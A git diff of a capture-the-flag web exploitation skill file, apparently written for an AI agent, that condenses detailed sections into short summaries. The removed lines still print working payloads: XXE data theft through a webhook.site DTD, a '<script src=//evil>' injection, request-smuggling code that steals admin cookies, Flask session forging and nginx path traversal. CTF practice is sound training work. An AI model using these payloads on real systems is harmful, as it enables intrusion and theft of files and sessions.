@@ -1,6 +1,6 @@
 ---
 name: ctf-web
-description: Web exploitation techniques for CTF challenges. Use when solving web security challenges involving XSS, SQLi, CSRF, file upload bypasses, JWT attacks, Web3/blockchain exploits, or other web vulnerabilities.
+description: Web exploitation techniques for CTF challenges. Use when solving web security challenges involving XSS, SQLi, SSTI, SSRF, CSRF, XXE, file upload bypasses, JWT attacks, prototype pollution, path traversal, command injection, request smuggling, DOM clobbering, Web3/blockchain, or authentication bypass.
 license: MIT
 allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
 metadata:
@@ -13,12 +13,12 @@ Quick reference for web CTF challenges. Each technique has a one-liner here; see
 
 ## Additional Resources
 
-- [server-side.md](server-side.md) - Server-side attacks: SQLi, SSTI, SSRF, XXE, command injection, code injection (Ruby/Perl/Python), ReDoS, file write→RCE, eval bypass
+- [server-side.md](server-side.md) - Server-side attacks: SQLi, SSTI, SSRF, XXE, command injection, code injection (Ruby/Perl/Python), ReDoS, file write→RCE, eval bypass, ExifTool CVE, Go rune/byte mismatch, zip symlink
 - [client-side.md](client-side.md) - Client-side attacks: XSS, CSRF, CSPT, cache poisoning, DOM tricks, React input filling, hidden elements
 - [auth-and-access.md](auth-and-access.md) - Auth/authz attacks: JWT, session, password inference, weak validation, client-side gates, NoSQL auth bypass
-- [node-and-prototype.md](node-and-prototype.md) - Node.js: prototype pollution, VM sandbox escape, Happy-DOM chain, flatnest CVE
+- [node-and-prototype.md](node-and-prototype.md) - Node.js: prototype pollution, VM sandbox escape, Happy-DOM chain, flatnest CVE, Lodash+Pug AST injection
 - [web3.md](web3.md) - Blockchain/Web3: Solidity exploits, proxy patterns, ABI encoding tricks, Foundry tooling
-- [cves.md](cves.md) - CVE-specific exploits: Next.js middleware bypass, curl credential leak, Uvicorn CRLF, urllib scheme bypass
+- [cves.md](cves.md) - CVE-specific exploits: Next.js middleware bypass, curl credential leak, Uvicorn CRLF, urllib scheme bypass, ExifTool DjVu, broken auth, AAEncode/JJEncode, protocol multiplexing
 
 ---
 
@@ -189,138 +189,33 @@ hashcat -m 16500 jwt.txt wordlist.txt        # JWT crack
 dalfox url http://target/?q=test             # XSS
 ```
 
-## Flask/Werkzeug Debug Mode Exploitation
+## Flask/Werkzeug Debug Mode
 
-**Pattern (Meowy, Nullcon 2026):** Flask app with Werkzeug debugger enabled + weak session secret.
-
-**Attack chain:**
-1. **Session secret brute-force:** When secret is generated from weak RNG (e.g., `random_word` library, short strings):
-   ```bash
-   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
-   # Or brute-force programmatically:
-   for word in wordlist:
-       try:
-           data = decode_flask_cookie(cookie, word)
-           print(f"Secret: {word}, Data: {data}")
-       except: pass
-   ```
-2. **Forge admin session:** Once secret is known, forge `is_admin=True`:
-   ```bash
-   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
-   ```
-3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
-4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request
-
-**Werkzeug debugger RCE:** If `/console` is accessible, generate PIN:
-- Read `/proc/self/environ`, `/sys/class/net/eth0/address`, `/proc/sys/kernel/random/boot_id`
-- Compute PIN using Werkzeug's algorithm
-- Execute arbitrary Python in debugger console
+Weak session secret brute-force + forge admin session + Werkzeug debugger PIN RCE. See [server-side.md](server-side.md#flaskwerkzeug-debug-mode-exploitation) for full attack chain.
 
 ## XXE with External DTD Filter Bypass
 
-**Pattern (PDFile, PascalCTF 2026):** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.
-
-**Technique:** Host malicious DTD on webhook.site or attacker server:
-```xml
-<!-- Remote DTD (hosted on webhook.site) -->
-<!ENTITY % data SYSTEM "file:///app/flag.txt">
-<!ENTITY leak "%data;">
-```
-
-```xml
-<!-- Uploaded XML (clean, passes filter) -->
-<?xml version="1.0"?>
-<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
-<book><title>&leak;</title></book>
-```
-
-**Key insight:** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.
-
-**Setup with webhook.site API:**
-```python
-import requests
-TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
-dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
-requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
-             json={"default_content": dtd, "default_content_type": "text/xml"})
-```
+Host malicious DTD externally to bypass upload keyword filters. See [server-side.md](server-side.md#xxe-with-external-dtd-filter-bypass) for payload and webhook.site setup.
 
 ## JSFuck Decoding
 
-**Pattern (JShit, PascalCTF 2026):** Page source contains JSFuck (`[]()!+` only). Decode by removing trailing `()()` and calling `.toString()` in Node.js:
-```javascript
-const code = fs.readFileSync('jsfuck.js', 'utf8');
-// Remove last () to get function object instead of executing
-const func = eval(code.slice(0, -2));
-console.log(func.toString());  // Reveals original code with hardcoded flag
-```
+Remove trailing `()()`, eval in Node.js, `.toString()` reveals original code. See [client-side.md](client-side.md#jsfuck-decoding).
 
-## Shadow DOM XSS (Pragyan 2026)
+## Shadow DOM XSS
 
-**Closed Shadow DOM exfiltration:** Wrap `attachShadow` in a Proxy to capture shadow root references:
-```javascript
-var _r, _o = Element.prototype.attachShadow;
-Element.prototype.attachShadow = new Proxy(_o, {
-  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
-});
-// After target script creates shadow DOM, _r contains the root
-```
+Proxy `attachShadow` to capture closed roots; `(0,eval)` for scope escape; `</script>` injection. See [client-side.md](client-side.md#shadow-dom-xss).
 
-**Indirect eval scope escape:** `(0,eval)('code')` escapes `with(document)` scope restrictions.
+## DOM Clobbering + MIME Mismatch
 
-**Payload smuggling via avatar URL:** Encode full JS payload in avatar URL after fixed prefix, extract with `avatar.slice(N)`:
-```html
-<svg/onload=(0,eval)('eval(avatar.slice(24))')>
-```
+`.jpg` served as `text/html`; `<form id="config">` clobbers JS globals. See [client-side.md](client-side.md#dom-clobbering-mime-mismatch-pragyan-2026).
 
-**`</script>` injection (Shadow Fight 2):** Keyword filters often miss HTML structural tags. `</script>` closes existing script context, `<script src=//evil>` loads external script. External script reads flag from `document.scripts[].textContent`.
+## HTTP Request Smuggling via Cache Proxy
 
-## DOM Clobbering + MIME Mismatch (Pragyan 2026)
+Cache proxy desync for cookie theft via incomplete POST body. See [client-side.md](client-side.md#http-request-smuggling-via-cache-proxy).
 
-**MIME type confusion:** CDN/server checks for `.jpeg` but not `.jpg` → serves `.jpg` as `text/html` → HTML in JPEG polyglot executes as page.
+## Path Traversal: URL-Encoded Slash Bypass
 
-**Form-based DOM clobbering:**
-```html
-<form id="config"><input name="canAdminVerify" value="1"></form>
-<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
-```
-
-## HTTP Request Smuggling via Cache Proxy (Pragyan 2026)
-
-**Cache proxy desync:** When a caching TCP proxy returns cached responses without consuming request bodies, leftover bytes are parsed as the next request.
-
-**Cookie theft pattern:**
-1. Create cached resource (e.g., blog post)
-2. Send request with cached URL + appended incomplete POST (large Content-Length, partial body)
-3. Cache proxy returns cached response, doesn't consume POST body
-4. Admin bot's next request bytes fill the POST body → stored on server
-5. Read stored request to extract admin's cookies
-
-```python
-inner_req = (
-    f"POST /create HTTP/1.1\r\n"
-    f"Host: {HOST}\r\n"
-    f"Cookie: session={user_session}\r\n"
-    f"Content-Length: 256\r\n"  # Large, but only partial body sent
-    f"\r\n"
-    f"content=LEAK_"  # Victim's request completes this
-)
-outer_req = (
-    f"GET /cached-page HTTP/1.1\r\n"
-    f"Content-Length: {len(inner_req)}\r\n"
-    f"\r\n"
-).encode() + inner_req
-```
-
-## Path Traversal: URL-Encoded Slash Bypass (Pragyan 2026)
-
-**`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
-```bash
-curl 'https://target/public%2f../nginx.conf'
-# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
-# Filesystem resolves to /public/../nginx.conf → /nginx.conf
-```
-**Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.
+`%2f` bypasses nginx route matching but filesystem resolves it. See [server-side.md](server-side.md#path-traversal-url-encoded-slash-bypass).
 
 ## Common Flag Locations
 
